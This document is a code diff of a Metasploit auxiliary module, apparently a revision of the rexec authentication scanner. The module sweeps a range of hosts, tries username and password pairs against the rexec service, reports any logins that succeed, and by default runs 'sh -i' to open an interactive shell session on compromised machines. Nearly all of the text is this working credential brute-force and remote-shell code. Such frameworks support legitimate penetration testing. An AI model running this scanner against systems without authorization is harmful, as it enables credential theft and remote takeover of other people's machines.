@@ -16,13 +16,14 @@ class MetasploitModule < Msf::Auxiliary
     super(
       'Name' => 'rexec Authentication Scanner',
       'Description' => %q{
-        This module will test a range of machines for a remote execution (rexec)
-        service (part of the r-commands suite) and report successful logins,
-        optionally attempt to spawn a session.
+          This module will test an rexec service on a range of machines and
+        report successful logins.
+
+        NOTE: This module requires access to bind to privileged ports (below 1024).
       },
       'References' => [
         [ 'CVE', '1999-0651' ],
-        [ 'CVE', '1999-0502' ] # Weak password
+        [ 'CVE', '1999-0502'] # Weak password
       ],
       'Author' => [ 'jduck' ],
       'License' => MSF_LICENSE
@@ -37,97 +38,79 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def run_host(_ip)
-    print_status('Starting rexec sweep')
+  def run_host(ip)
+    print_status("Starting rexec sweep")
 
     if datastore['ENABLE_STDERR']
-      # Bind a local port for the target(s) to connect back to for stderr
+      # For each host, bind a privileged listening port for the target to connect
+      # back to.
       ret = listen_on_random_port(datastore['STDERR_PORT'])
-      return :abort if !ret
+      if not ret
+        return :abort
+      end
 
       sd, stderr_port = ret
     else
       sd = stderr_port = nil
     end
 
-    # The maximum time for a host is set here
-    Timeout.timeout(300) do
-      each_user_pass do |user, pass|
+    # The maximum time for a host is set here.
+    Timeout.timeout(300) {
+      each_user_pass { |user, pass|
         do_login(user, pass, sd, stderr_port)
-      end
-    end
+      }
+    }
 
     sd.close if sd
   end
 
   def do_login(user, pass, sfd, stderr_port)
-    vprint_status("rexec - Attempting: #{user}:#{pass}")
+    vprint_status("Attempting rexec with username:password '#{user}':'#{pass}'")
 
     cmd = datastore['CMD']
     cmd ||= 'sh -i 2>&1'
 
-    # We must connect from a privileged port
-    return :abort if !connect
+    # We must connect from a privileged port.
+    return :abort if not connect
 
     sock.put("#{stderr_port}\x00#{user}\x00#{pass}\x00#{cmd}\x00")
 
-    if sfd && stderr_port
+    if sfd and stderr_port
       stderr_sock = sfd.accept
       add_socket(stderr_sock)
     else
       stderr_sock = nil
     end
 
-    # Get the first byte
-    buf = sock.get_once(1) || ''
-
     # NOTE: We report this here, since we are awfully convinced now that this is really
-    # an rexec service
-    service_data = {
-      address: rhost,
-      port: rport,
-      # exec (IANA) != rexec (Protocol) --- https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=512
-      service_name: 'exec',
-      proof: buf,
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
+    # an rexec service.
     report_service(
-      host: service_data[:address],
-      port: service_data[:port],
-      proto: service_data[:protocol],
-      name: service_data[:service_name]
+      :host => rhost,
+      :port => rport,
+      :proto => 'tcp',
+      :name => 'exec'
     )
 
-    # The expected response is a null byte
+    # Read the expected nul byte response.
+    buf = sock.get_once(1) || ''
     if buf != "\x00"
-      # Get everything else
-      buf = sock.get_once(-1) || ''
-      vprint_error("Result: #{buf.gsub(/[[:space:]]+/, ' ')}") unless buf.empty?
-      # "Where are you" happens with rexecd in netkit-rsh v0.17 when it fails to-do a rDNS
-      if buf.include?('Where are you?')
-        print_error("The rexecd service could not resolve a hostname for #{Rex::Socket.source_address(target_host)}. Ensure a reverse DNS (PTR) record exists for your attacking host.")
-        # Stop, isn't any point going forwards
-        return :abort
-      end
-      # Bad login
+      buf = sock.get_once(-1) || ""
+      vprint_error("Result: #{buf.gsub(/[[:space:]]+/, ' ')}")
       return :failed
     end
 
-    # Should we report a vuln here? rexec allowed w/o password?!
-    print_good("rexec successful login: #{user}:#{pass}")
-    start_rexec_session(service_data[:address], service_data[:port], user, pass, stderr_sock, service_data)
+    # should we report a vuln here? rexec allowed w/o password?!
+    print_good("rexec '#{user}' : '#{pass}'")
+    start_rexec_session(rhost, rport, user, pass, buf, stderr_sock)
 
     return :next_user
-  # For debugging only
+
+  # For debugging only.
   # rescue ::Exception
   #  print_error("#{$!}")
   # return :abort
-  rescue ::EOFError
-    return :failed
   ensure
-    disconnect
+    disconnect()
   end
 
   #
@@ -140,26 +123,26 @@ class MetasploitModule < Msf::Auxiliary
       sd = listen_on_port(stderr_port)
     else
       stderr_port = 1024 + rand(0x10000 - 1024)
-      512.times do
+      512.times {
         sd = listen_on_port(stderr_port)
         break if sd
 
         stderr_port = 1024 + rand(0x10000 - 1024)
-      end
+      }
     end
 
-    if !sd
-      print_error("Unable to bind to listener port: #{stderr_port}/TCP")
+    if not sd
+      print_error("Unable to bind to listener port")
       return false
     end
 
     add_socket(sd)
-    print_status("Listening on port #{stderr_port}/TCP")
+    print_status("Listening on port #{stderr_port}")
     [ sd, stderr_port ]
   end
 
   def listen_on_port(stderr_port)
-    vprint_status("Trying to listen on port #{stderr_port}/TCP")
+    vprint_status("Trying to listen on port #{stderr_port} ..")
     sd = nil
     begin
       sd = Rex::Socket.create_tcp_server('LocalPort' => stderr_port)
@@ -170,9 +153,18 @@ class MetasploitModule < Msf::Auxiliary
     sd
   end
 
-  def start_rexec_session(host, port, user, pass, stderr_sock, service_data)
+  def start_rexec_session(host, port, user, pass, proof, stderr_sock)
+    service_data = {
+      address: host,
+      port: port,
+      service_name: 'exec',
+      proof: proof,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
     credential_data = {
-      module_fullname: fullname,
+      module_fullname: self.fullname,
       origin_type: :service,
       username: user,
       # Save a reference to the socket so we don't GC prematurely
@@ -185,9 +177,9 @@ class MetasploitModule < Msf::Auxiliary
     }.merge(service_data)
 
     if datastore['CreateSession']
-      start_session(self, "rexec #{user}:#{pass} (#{host}:#{port})", login_data, false, sock)
+      start_session(self, "rexec #{user}:#{pass} (#{host}:#{port})", login_data, false, self.sock)
       # Don't tie the life of this socket to the exploit
-      sockets.delete(stderr_sock)
+      self.sockets.delete(stderr_sock)
       self.sock = nil
     end
   end
